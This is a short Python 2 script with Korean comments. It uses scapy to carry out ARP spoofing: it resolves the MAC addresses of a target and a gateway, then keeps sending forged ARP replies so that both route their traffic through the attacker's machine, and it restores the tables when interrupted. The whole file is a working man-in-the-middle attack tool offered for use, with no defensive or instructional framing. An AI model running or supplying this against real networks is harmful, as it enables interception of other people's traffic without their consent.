#-*- coding: utf-8 -*-
import os, sys, threading, time
from scapy.all import *

waitTime=5
    
def getMacAddr(destIP): # 매개변수로 받은 IP로 ARP를 브로드 캐스팅해서 맥어드레스를 얻는 함수
    responses, unanswered=srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=destIP), timeout=1, retry=10)
    for s,r in responses:
        return r[Ether].src
    
def arpSpoofer(gatewayIP, gatewayMacAddress, targetIP, targetMacAddress, attackerMacAddress): # ARP Spoofing 하는 함수
    try:
        while(1):
            send(ARP(op=2, psrc=gatewayIP, pdst=targetIP, hwsrc=attackerMacAddress, hwdst=targetMacAddress)) # 타겟의 ARP 테이블 감염
            send(ARP(op=2, psrc=targetIP, pdst=gatewayIP, hwsrc=attackerMacAddress, hwdst=gatewayMacAddress)) # 게이트웨이의 ARP 테이블 감염
            time.sleep(waitTime) # 지정 시간만큼 대기
    except KeyboardInterrupt:
        restore(gatewayIP, gatewayMacAddress, targetIP, targetMacAddress)
        exit(0)
   
def restore(gatewayIP, gatewayMacAddress, targetIP, targetMacAddress): # 게이트웨이와 타겟PC의 변조된 ARP 테이블을 원래대로 복원하기 위해 공격자의 맥 어드레스가 아닌 각자의 원래 맥 어드레스로 ARP를 브로드캐스팅
    send(ARP(op=2, psrc=gatewayIP, pdst=targetIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gatewayMacAddress), count=5) # 타겟의 ARP 테이블 복원
    send(ARP(op=2, psrc=targetIP, pdst=gatewayIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=targetMacAddress), count=5) # 게이트웨이의 ARP 테이블 복원
    print "[+] Send Restore ARP Packet"
    
def main():
    try:
        targetIP=raw_input("Input Target IP : ") # 타겟 IP
        gatewayIP=raw_input("Input Gateway IP : ") # 게이트웨이 IP
        attackerMacAddress=raw_input("Input Attacker Mac Address( ex) 00:00:00:00:00:00) : ") # 공격자 맥 어드레스
        gatewayMacAddress=getMacAddr(gatewayIP) # 게이트웨이 맥 어드레스 저장
        #print str(gatewayMacAddress)
        targetMacAddress=getMacAddr(targetIP) # 타겟 맥 어드레스 저장
        #print str(targetMacAddress)
        t=threading.Thread(target=arpSpoofer, args=(gatewayIP, gatewayMacAddress, targetIP, targetMacAddress, attackerMacAddress)) # 스레드 시작
        t.start()
    except KeyboardInterrupt:
        restore(gatewayIP, gatewayMacAddress, targetIP, targetMacAddress)
        exit(0)

if __name__=="__main__":
    main()
